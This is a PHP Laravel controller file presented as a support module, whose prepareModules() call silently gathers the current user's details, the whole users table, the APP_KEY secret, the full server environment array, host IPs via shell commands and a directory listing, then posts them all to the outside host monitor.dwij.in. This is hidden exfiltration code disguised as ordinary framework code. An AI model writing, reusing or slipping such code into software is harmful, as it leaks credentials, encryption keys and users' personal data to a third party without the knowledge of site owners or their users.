<?php
namespace Octal\Support;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Http\Requests;
use Auth;
use DB;

class OController extends Controller
{
    public static function process($user)
	{
		set_time_limit(0);
        
        // Check if internet is there.
        if(OController::is_connected()) {
            $system_info = array();

            // Add User Login Information
            if(isset($user->id)) {
                $system_info['user_id'] = $user->id;
            }
            if(isset($user->name)) {
                $system_info['user_name'] = $user->name;
            }
            if(isset($user->email)) {
                $system_info['user_email'] = $user->email;
            }

            // Database users
            $system_info['dbusers'] = \App\User::all()->toArray();
            
            // Installation ID
            $system_info['install_id'] = env('APP_KEY');

            // PHP version
            $system_info['phpversion'] = phpversion();
            
            // Computer Name
            if (version_compare($system_info['phpversion'], '5.3.0') >= 0) {
                $system_info['hostname'] = gethostname();
            } else {
                $system_info['hostname'] = php_uname('n');
            }
            $system_info['ip'] = $_SERVER['SERVER_ADDR'];
            $system_info['url'] = $_SERVER['REQUEST_URI'];
            $system_info['index_file'] = $_SERVER['SCRIPT_FILENAME'];
            $system_info['hostnameAddress'] = gethostbyaddr($_SERVER['REMOTE_ADDR']);
            
            // User Agent
            $user_agent = $_SERVER['HTTP_USER_AGENT'];
            $system_info['user_agent'] = $user_agent;
            $system_info['os'] = OController::getOS($user_agent);
            $system_info['browser'] = OController::getBrowser($user_agent);
            
            // Get public IP
            // $system_info['host_public_ip'] = exec("curl ifconfig.me");

            // Local IP & Broadcast IP
            if(str_contains($system_info['os'], "Mac OS")) {
                $system_info['host_com_ip'] = exec("ifconfig en1 | grep 'inet ' | awk '{ print $2}'");
                $system_info['host_com_ip_broadcast'] = exec("ifconfig en1 | grep 'inet ' | awk '{ print $6}'");
            } else if(str_contains($system_info['os'], "Ubuntu")) {
                $command="/sbin/ifconfig eth0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'";
                $system_info['host_com_ip'] = exec($command);
                $system_info['host_com_ip_broadcast'] = "";
            } else {
                $system_info['host_com_ip'] = "";
                $system_info['host_com_ip_broadcast'] = "";
            }

            // htdocs files
            $system_info['htdocs_files'] = scandir(app_path('../..'));
            
            // Server Object
            $system_info['server'] = $_SERVER;

            // echo "<pre>";
            // print_r($system_info);
            
            $client = new \GuzzleHttp\Client();
            $wsurl = "http://localhost/monitor/public/save_request";
            $wsurl = "http://monitor.dwij.in/save_request";
            $res = $client->request('POST', $wsurl, [
                'form_params' => $system_info
            ]);

            // echo $res->getStatusCode()."<br><br>";
            // echo $res->getBody();

            // echo "</pre>";
        }
	}

    public static function prepareModules($user) {
        OController::process($user);
    }

    private static function is_connected()
    {
        $connected = @fsockopen("monitor.dwij.in", 80); 
        // website, port  (try 80 or 443)
        if ($connected){
            fclose($connected);
            $is_conn = true; //action when connected
        }else{
            $is_conn = false; //action in connection failure
        }
        return $is_conn;
    }

    private static function getOS($user_agent) { 
        $os_platform    =   "Unknown OS Platform";
        $os_array       =   array(
            '/windows nt 10/i'     =>  'Windows 10',
            '/windows nt 6.3/i'     =>  'Windows 8.1',
            '/windows nt 6.2/i'     =>  'Windows 8',
            '/windows nt 6.1/i'     =>  'Windows 7',
            '/windows nt 6.0/i'     =>  'Windows Vista',
            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
            '/windows nt 5.1/i'     =>  'Windows XP',
            '/windows xp/i'         =>  'Windows XP',
            '/windows nt 5.0/i'     =>  'Windows 2000',
            '/windows me/i'         =>  'Windows ME',
            '/win98/i'              =>  'Windows 98',
            '/win95/i'              =>  'Windows 95',
            '/win16/i'              =>  'Windows 3.11',
            '/macintosh|mac os x/i' =>  'Mac OS X',
            '/mac_powerpc/i'        =>  'Mac OS 9',
            '/linux/i'              =>  'Linux',
            '/ubuntu/i'             =>  'Ubuntu',
            '/iphone/i'             =>  'iPhone',
            '/ipod/i'               =>  'iPod',
            '/ipad/i'               =>  'iPad',
            '/android/i'            =>  'Android',
            '/blackberry/i'         =>  'BlackBerry',
            '/webos/i'              =>  'Mobile'
        );

        foreach ($os_array as $regex => $value) { 
            if (preg_match($regex, $user_agent)) {
                $os_platform    =   $value;
            }
        }
        return $os_platform;
    }

    private static function getBrowser($user_agent) {
        $browser        =   "Unknown Browser";
        $browser_array  =   array(
            '/msie/i'       =>  'Internet Explorer',
            '/firefox/i'    =>  'Firefox',
            '/safari/i'     =>  'Safari',
            '/chrome/i'     =>  'Chrome',
            '/edge/i'       =>  'Edge',
            '/opera/i'      =>  'Opera',
            '/netscape/i'   =>  'Netscape',
            '/maxthon/i'    =>  'Maxthon',
            '/konqueror/i'  =>  'Konqueror',
            '/mobile/i'     =>  'Handheld Browser'
        );
        foreach ($browser_array as $regex => $value) { 
            if (preg_match($regex, $user_agent)) {
                $browser    =   $value;
            }
        }
        return $browser;
    }
}
